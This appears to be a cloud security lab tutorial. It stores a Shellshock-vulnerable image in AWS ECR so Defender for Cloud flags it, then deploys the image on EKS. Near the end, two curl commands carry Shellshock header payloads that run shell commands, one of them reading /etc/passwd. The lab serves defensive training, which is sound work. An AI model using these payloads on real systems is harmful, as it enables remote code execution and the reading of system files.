# In this lab we will use a ShellShock vulnerable docker image from the Docker Hub, store it in the AWS ECR for Defender to trigger a vulnerability scan

As similar approach to scan for vulnerabilities in Azure ACR, Defender for Cloud can also perfor scans for container images stored in AWS ECR

This is valid when you have configured the Defender connector for AWS, out of scope for this lab

First, create an AWS ECR to store your test images

```
aws ecr create-repository --repository-name <aws-ecr-name> --region <aws-region>
```

Then, you need to log into your AWS ECR from your working machine

```
aws ecr get-login-password --region <aws-region> | sudo docker login --username AWS --password-stdin <aws-accountID>.dkr.ecr.<aws-region>.amazonaws.com
```

Download a vulnerable image from Docker Hub

```
docker pull vulnerables/cve-2014-6271
```

Run the following command to properly tag your image to match your ECR account name.

```
docker tag vulnerables/cve-2014-6271 <aws-accountID>.dkr.ecr.<aws-region>.amazonaws.com/<aws-ecr-name>:cve-2014-6271
```

Finally, push the image to the registry

```
docker push <aws-accountID>.dkr.ecr.<aws-region>.amazonaws.com/<aws-ecr-name>:cve-2014-6271
```

In max of 2 hours Defender will show a recommendation to fix the vulnerability findings of your AWS ECR. This recommendation is part of SAST scanning, once the image has been pushed to the registry the sandbox will trigger the scan of vulnerabilities



![AWS ECR Summary reco](/images/aws-ecr-summary.png)

And clicking on the affected resources you see the image details

![AWS ECR Summary reco](/images/aws-ecr-detail.png)

Now, it is time to deploy the container as a running pod in the AWS EKS environment

Note we export the pod using the port 8080

As we will connect from another pod in the cluster to exploit RCE vulnerabilities of this container, we need to create a Kubernetes Service and map it to this deployment using match labels

```
apiVersion: v1
kind: Service
metadata:
  name: service-shell-shock
spec:
  type: ClusterIP  # ClusterIP is the default service type even if not specified
  selector:
    tag: shell-shock
  ports:
  - name: port8080
    protocol: TCP
    port: 8080  # this is the service port
    targetPort: 80 # this is the container port
```

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: shell-shock
spec:
  selector:
    matchLabels:
      app: shell-shock
  template:
    metadata:
      labels:
        app: shell-shock # the label for the pods and the deployments
    spec:
      containers:
      - name: shell-shock
        image: k8sgoatacr.azurecr.io/cve-2014-6271:latest # IMPORTANT: update with your own repository
        imagePullPolicy: Always
        ports:
        - containerPort: 8080 
```

Get the pods ip address using

```
kubectl get pods -o wide
```

Enter into the shell-shock container

```
kubectl exec -it [shell-shock-pod] -- /bin/bash
```

And from the nginx pod in the cluster, we wille exploit RCE

```
kubectl exec -it [name-nginx-attacker-pod] -- /bin/bash
```

From here, issue commands to list /etc/passwd

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://[ip-address-shell-shock-pod]:80/cgi-bin/vulnerable
```

and

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" http://[ip-address-shell-shock-pod]/cgi-bin/vulnerable
```

Now, wait for Defender to raise a recommendation under the ECR to resolve vulnerabilities found. This recommendation is part of SAST scanning, once the image has been pushed to the registry the sandbox will trigger the scan of vulnerabilities





